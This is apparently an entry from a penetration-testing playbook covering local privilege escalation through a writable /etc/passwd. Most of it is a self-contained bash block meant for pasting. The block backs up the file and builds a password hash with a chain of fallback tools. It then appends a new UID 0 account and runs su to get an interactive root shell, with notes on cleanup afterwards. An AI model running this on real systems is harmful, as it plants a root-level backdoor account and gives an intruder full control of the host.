# LPRIV-19. Writable `/etc/passwd`

**Run this when:** `/etc/passwd` is writable by the current user.

Writable check, backup:

```bash
ls -l /etc/passwd
cp --preserve=all -- /etc/passwd /tmp/passwd.bak
sha256sum -- /etc/passwd /tmp/passwd.bak
command -v mkpasswd openssl python3 python2 perl
```

**Look for:** owner write on the file, and any one hash tool in the list. The
account is added to `/etc/passwd` only; `/etc/shadow` stays untouched, so the
hash lives in that second field. Field 2 accepts any crypt(3) hash the box's
glibc understands, not one fixed algorithm.

**If found:** this block is self-contained, so paste it alone. It sets the
password once, prints the hash, appends, and logs in.

Password, hash, append:

```bash
PW='test'
NAME=test
while getent passwd "$NAME" >/dev/null; do NAME="${NAME}0"; done
SHELL_BIN=$(command -v bash || command -v sh || printf '%s' /bin/sh)

HASH=
if command -v mkpasswd >/dev/null 2>&1; then
  HASH=$(mkpasswd -m sha-512 "$PW")
fi
if [ -z "$HASH" ] && [ "$(openssl passwd -6 x 2>/dev/null | cut -c1-3)" = '$6$' ]; then
  HASH=$(openssl passwd -6 "$PW")
fi
if [ -z "$HASH" ]; then
  HASH=$(python3 -c 'import crypt,sys; print(crypt.crypt(sys.argv[1], crypt.mksalt(crypt.METHOD_SHA512)))' "$PW" 2>/dev/null)
fi
if [ -z "$HASH" ]; then
  HASH=$(python2 -c 'import crypt,sys; print crypt.crypt(sys.argv[1], "$6$test$")' "$PW" 2>/dev/null)
fi
if [ -z "$HASH" ]; then
  HASH=$(perl -e 'print crypt($ARGV[0], q($1$test$))' "$PW" 2>/dev/null)
fi
if [ -z "$HASH" ]; then
  HASH=$(openssl passwd -1 "$PW" 2>/dev/null || openssl passwd -crypt "$PW")
fi

printf 'Hash: %s\n' "$HASH"
printf '%s:%s:0:0:root:/root:%s\n' "$NAME" "$HASH" "$SHELL_BIN" >> /etc/passwd
getent passwd "$NAME"
su "$NAME" -c id
su "$NAME"
```

The `-c id` line only proves the account; `su "$NAME"` alone opens the interactive
root shell, and `su - "$NAME"` also loads root's environment and starts in
`/root`. The outer shell stays michael, whose default `/root` is not traversable
(`550`), so `cd /root` from that shell fails until you are inside `su`.

Every command expands `$PW`, so the value is pasted once. Change it when you want
a different password; if it contains a single quote, switch the assignment to
double quotes and escape `$` and `!` inside it.

A usage dump from `openssl passwd -6` is not a failure; it means this OpenSSL
predates 1.1.1 and the chain moves on. An empty `$HASH` after the chain means no
route; then copy field 2 from any account that still holds a hash, or use
`-crypt`, which truncates to eight characters.

`su` prompts for the password you set; it is not passwordless. Expect `uid=0` from
`id`. Remove the line afterwards, or restore the copy when the file must stay
byte-exact. A second UID 0 account is a real login, not a modified user.
